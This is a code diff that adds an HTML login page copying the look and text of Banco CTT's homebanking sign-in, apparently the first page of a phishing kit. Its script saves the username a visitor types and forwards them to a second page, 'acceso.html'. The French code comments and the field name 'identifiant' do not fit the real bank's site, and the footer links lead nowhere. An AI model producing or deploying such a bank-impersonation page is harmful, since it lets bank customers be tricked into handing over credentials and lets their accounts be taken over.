@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco CTT - Iniciar sessão</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .logo {
+            padding: 30px 50px;
+            font-size: 32px;
+            font-weight: 300;
+            color: #333;
+        }
+
+        .logo span {
+            color: #e60012;
+            font-weight: 700;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            position: relative;
+            padding: 0 50px;
+        }
+
+        .red-line {
+            position: absolute;
+            left: 35%;
+            top: -50px;
+            width: 4px;
+            height: 120%;
+            background: #e60012;
+            transform: rotate(15deg);
+            transform-origin: top center;
+            z-index: 1;
+        }
+
+        .red-line::before {
+            content: '';
+            position: absolute;
+            left: -200px;
+            top: 80%;
+            width: 300px;
+            height: 4px;
+            background: #e60012;
+            transform: rotate(-25deg);
+            transform-origin: left center;
+        }
+
+        .left-column {
+            width: 45%;
+            padding-top: 20px;
+            z-index: 2;
+        }
+
+        .left-column h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .left-column p {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 40px;
+        }
+
+        .security-box {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            max-width: 400px;
+        }
+
+        .security-icon {
+            width: 40px;
+            height: 40px;
+            background: #00a0b0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .security-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .security-content h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .security-content p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        .right-column {
+            width: 55%;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 20px;
+            z-index: 2;
+        }
+
+        .login-form {
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .login-form h2 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .login-form .subtitle {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 15px;
+            background: #f5f5f5;
+            color: #333;
+        }
+
+        .input-group input::placeholder {
+            color: #999;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background: #e60012;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: background 0.3s;
+        }
+
+        .btn-continue:hover {
+            background: #c40010;
+        }
+
+        .btn-recover {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #e60012;
+            border: 1px solid #e60012;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 25px;
+            transition: all 0.3s;
+        }
+
+        .btn-recover:hover {
+            background: #e60012;
+            color: white;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+
+        .separator span {
+            padding: 0 15px;
+        }
+
+        .activation-box {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: left;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
+        .activation-icon {
+            width: 40px;
+            height: 40px;
+            background: #e8f4f8;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .activation-icon::after {
+            content: '📱';
+            font-size: 20px;
+        }
+
+        .activation-content h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .activation-content p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 50px;
+            border-top: 1px solid #f0f0f0;
+            margin-top: auto;
+        }
+
+        .footer-links a {
+            color: #00a0b0;
+            text-decoration: none;
+            font-size: 14px;
+            margin-right: 20px;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #333;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .language-selector::before {
+            content: '🌐';
+            font-size: 16px;
+        }
+
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+                padding: 0 20px;
+            }
+
+            .left-column,
+            .right-column {
+                width: 100%;
+            }
+
+            .red-line {
+                display: none;
+            }
+
+            .left-column {
+                margin-bottom: 40px;
+            }
+
+            footer {
+                flex-direction: column;
+                gap: 15px;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">banco<span>ctt</span></div>
+
+    <div class="main-container">
+        <div class="red-line"></div>
+
+        <div class="left-column">
+            <h1>Bem-vindo ao seu banco, à sua medida</h1>
+            <p>Digital, flexível e sempre ao seu alcance</p>
+
+            <div class="security-box">
+                <div class="security-icon"></div>
+                <div class="security-content">
+                    <h3>Dica de segurança</h3>
+                    <p>O Banco CTT nunca solicita a sua palavra-passe via email/SMS nem por telefone. Consulte o nosso Guia de segurança</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="right-column">
+            <form class="login-form" id="form1">
+                <h2>Iniciar sessão</h2>
+                <p class="subtitle">Por favor, introduza o seu nome de utilizador do homebanking.</p>
+
+                <div class="input-group">
+                    <input type="text" id="identifiant" name="identifiant" placeholder="Nome de utilizador" required>
+                </div>
+
+                <button type="submit" class="btn-continue">Continuar</button>
+                <button type="button" class="btn-recover">Recuperar nome de utilizador</button>
+
+                <div class="separator">
+                    <span>ou</span>
+                </div>
+
+                <div class="activation-box">
+                    <div class="activation-icon"></div>
+                    <div class="activation-content">
+                        <h3>Ativar os Canais Digitais</h3>
+                        <p>Se é o seu primeiro acesso aos Canais Digitais ou não se recorda das suas credenciais, clique aqui para entrar com os seus dados pessoais</p>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Guia de segurança</a>
+            <a href="#">Contactos</a>
+            <a href="#">Onde estamos</a>
+        </div>
+        <div class="language-selector">
+            Português
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('form1').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Stocke l'identifiant dans localStorage
+            const identifiant = document.getElementById('identifiant').value;
+            localStorage.setItem('banco_ctt_identifiant', identifiant);
+            
+            // Redirige vers la page 2
+            window.location.href = 'acceso.html';
+        });
+    </script>
+</body>
+</html>
